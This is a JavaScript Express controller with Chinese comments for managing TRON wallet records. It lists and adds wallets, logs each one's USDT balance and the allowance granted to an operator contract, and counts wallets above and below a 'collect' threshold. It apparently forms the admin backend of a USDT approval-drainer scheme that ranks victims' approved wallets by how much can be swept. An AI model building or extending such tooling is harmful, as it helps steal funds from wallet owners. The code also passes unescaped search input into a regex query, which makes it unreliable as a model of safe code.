const Wallet = require('../models/Wallet');
const TronService = require('../services/TronService');

class WalletController {
  // 获取所有钱包
  async getWallets(req, res) {
    try {
      const { page = 1, limit = 10, search = '', status = 'active' } = req.query;
      
      const query = { status };
      if (search) {
        query.$or = [
          { address: { $regex: search, $options: 'i' } },
          { name: { $regex: search, $options: 'i' } }
        ];
      }

      const wallets = await Wallet.find(query)
        .sort({ totalBalance: -1, lastChecked: -1 })
        .limit(limit * 1)
        .skip((page - 1) * limit);

      const total = await Wallet.countDocuments(query);

      res.json({
        wallets,
        totalPages: Math.ceil(total / limit),
        currentPage: page,
        total
      });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  }

  // 添加钱包
  async addWallet(req, res) {
    try {
      const { address, name } = req.body;

      // 检查是否已存在
      const existingWallet = await Wallet.findOne({ address });
      if (existingWallet) {
        return res.status(400).json({ error: '钱包已存在' });
      }

      // 获取初始余额
      const balanceInfo = await TronService.getWalletBalance(address);
      const allowance = await TronService.getAllowance(address, process.env.CONTRACT_ADDRESS);

      const wallet = new Wallet({
        address,
        name,
        trxBalance: balanceInfo.trxBalance,
        usdtBalance: balanceInfo.usdtBalance,
        usdtAllowance: allowance,
        totalBalance: balanceInfo.usdtBalance
      });

      await wallet.save();

      res.status(201).json(wallet);
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  }

  // 获取钱包统计
  async getWalletStats(req, res) {
    try {
      const totalWallets = await Wallet.countDocuments({ status: 'active' });
      const totalBalance = await Wallet.aggregate([
        { $match: { status: 'active' } },
        { $group: { _id: null, total: { $sum: '$totalBalance' } } }
      ]);

      const largeWallets = await Wallet.countDocuments({
        status: 'active',
        totalBalance: { $gte: process.env.COLLECT_THRESHOLD }
      });

      const smallWallets = await Wallet.countDocuments({
        status: 'active',
        totalBalance: { $lt: process.env.COLLECT_THRESHOLD, $gt: 0 }
      });

      const largeAmount = await Wallet.aggregate([
        { 
          $match: { 
            status: 'active',
            totalBalance: { $gte: process.env.COLLECT_THRESHOLD }
          } 
        },
        { $group: { _id: null, total: { $sum: '$totalBalance' } } }
      ]);

      const smallAmount = await Wallet.aggregate([
        { 
          $match: { 
            status: 'active',
            totalBalance: { $lt: process.env.COLLECT_THRESHOLD, $gt: 0 }
          } 
        },
        { $group: { _id: null, total: { $sum: '$totalBalance' } } }
      ]);

      res.json({
        totalWallets,
        totalBalance: totalBalance[0]?.total || 0,
        largeWallets,
        smallWallets,
        largeAmount: largeAmount[0]?.total || 0,
        smallAmount: smallAmount[0]?.total || 0
      });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  }

  // 删除钱包
  async deleteWallet(req, res) {
    try {
      const { id } = req.params;

      const wallet = await Wallet.findByIdAndUpdate(
        id,
        { status: 'revoked', isAuthorized: false },
        { new: true }
      );

      if (!wallet) {
        return res.status(404).json({ error: '钱包未找到' });
      }

      res.json({ message: '钱包已取消授权' });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  }
}

module.exports = new WalletController();